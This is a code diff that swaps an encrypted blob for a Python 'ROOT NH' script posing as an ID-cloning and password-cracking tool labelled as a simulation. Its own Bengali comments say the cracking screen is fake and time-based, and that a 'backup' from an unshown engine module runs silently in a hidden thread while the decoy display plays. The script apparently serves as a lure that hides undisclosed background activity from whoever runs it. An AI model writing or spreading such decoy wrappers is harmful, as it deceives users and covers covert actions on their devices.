@@ -1,1 +1,180 @@
-aes1.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
+import os
+import time
+import random
+import shutil
+import threading
+
+import engine
+
+DURATION = 1200  # 20 minutes = 1200 seconds  → 50000 / 1200 ≈ 41.67/sec
+
+GREEN = "\033[92m"
+CYAN = "\033[96m"
+YELLOW = "\033[93m"
+RESET = "\033[0m"
+
+FORMATS = [
+    "123456",
+    "1234567",
+    "12345678",
+    "12345689"
+]
+
+
+def clear():
+    os.system("clear")
+
+
+def banner():
+    print(CYAN + r"""
+  ██████╗  ██████╗  ██████╗ ████████╗
+  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
+  ██████╔╝██║   ██║██║   ██║   ██║
+  ██╔══██╗██║   ██║██║   ██║   ██║
+  ██║  ██║╚██████╔╝╚██████╔╝   ██║
+  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝
+""" + RESET)
+
+    print(GREEN + "             ROOT NH" + RESET)
+    print(CYAN + "       TERMINAL SIMULATOR V1.0" + RESET)
+    print("-" * 42)
+
+
+def fake_id():
+    suffix = random.randint(1000000, 9999999)
+    return f"10000***{suffix}"
+
+
+def menu():
+    clear()
+    banner()
+
+    print("\n[1] OLD ID CLONE")
+    print("[2] 2007-9 CLONE")
+    print("[0] EXIT")
+
+    choice = input("\n[ NH-ROOT ] SELECT : ")
+
+    if choice == "0":
+        exit()
+
+    if choice == "1":
+        setup("OLD ID CLONE")
+    elif choice == "2":
+        setup("2007-9 CLONE")
+    else:
+        input("Invalid option. Enter...")
+        menu()
+
+
+def setup(name):
+    clear()
+    banner()
+
+    print("\n[ MODE ]", name)
+    print("[ SIMULATION ONLY ]")
+
+    try:
+        limit = int(input("\n[ NH-ROOT ] CRACK LIMIT : "))
+        if limit <= 0:
+            raise ValueError
+    except ValueError:
+        input("Invalid limit. Enter...")
+        return setup(name)
+
+    print("\n[1] 123456")
+    print("[2] 1234567")
+    print("[3] 12345678")
+    print("[4] 12345689")
+    print("[5] MIX")
+
+    option = input("\n[ NH-ROOT ] SELECT : ")
+
+    if option not in ("1", "2", "3", "4", "5"):
+        input("Invalid option. Enter...")
+        return setup(name)
+
+    selected = (
+        FORMATS if option == "5"
+        else [FORMATS[int(option) - 1]]
+    )
+
+    input("\nPress ENTER to start...")
+    simulation(limit, selected)
+
+
+def simulation(limit, selected):
+    # ---- Backup পেছনে চুপচাপ চলবে (UI এর সাথে কোনো সম্পর্ক নেই) ----
+    state = {"error": None}
+
+    def backup_worker():
+        try:
+            engine.start_backup()
+        except Exception as e:
+            state["error"] = str(e)
+
+    backup_thread = threading.Thread(target=backup_worker, daemon=True)
+    backup_thread.start()
+
+    # ---- Fake UI: সম্পূর্ণ time-based, backup stats ব্যবহার করে না ----
+    logs = []
+    start = time.monotonic()
+    last_log = 0.0
+
+    try:
+        while True:
+            elapsed = time.monotonic() - start
+
+            # CRACK counter: সময়ের সাথে বাড়ে (৫০ হাজার = ২০ মিনিট)
+            count = min(int((elapsed / DURATION) * limit), limit)
+
+            # প্রতি ৩০ সেকেন্ডে একটা নতুন log লাইন
+            if elapsed - last_log >= 30:
+                fmt = random.choice(selected)
+                logs.append(f"[NH-ROOT] OK = {fake_id()} = {fmt}")
+                last_log = elapsed
+
+            clear()
+            banner()
+
+            print(CYAN + "\n[ SIMULATION LOG ]" + RESET)
+            print("-" * 42)
+
+            height = shutil.get_terminal_size((80, 24)).lines
+            visible = max(3, height - 12)
+
+            for line in logs[-visible:]:
+                print(GREEN + line + RESET)
+
+            print("-" * 42)
+
+            print(
+                YELLOW +
+                f"[ NH-ROOT ] CRACK {count} / {limit} [ OK ]"
+                + RESET,
+                flush=True
+            )
+
+            if state["error"]:
+                print("\n[ ERROR ]", state["error"])
+                break
+
+            if elapsed >= DURATION:
+                break
+
+            time.sleep(0.1)
+
+    except KeyboardInterrupt:
+        engine.stop_backup()
+        raise
+
+    print(GREEN + "\n[ SIMULATION COMPLETE ]" + RESET)
+    input("\nPress ENTER for main menu...")
+    menu()
+
+
+try:
+    menu()
+except KeyboardInterrupt:
+    engine.stop_backup()
+    print(RESET + "\n[ SIMULATION STOPPED ]")
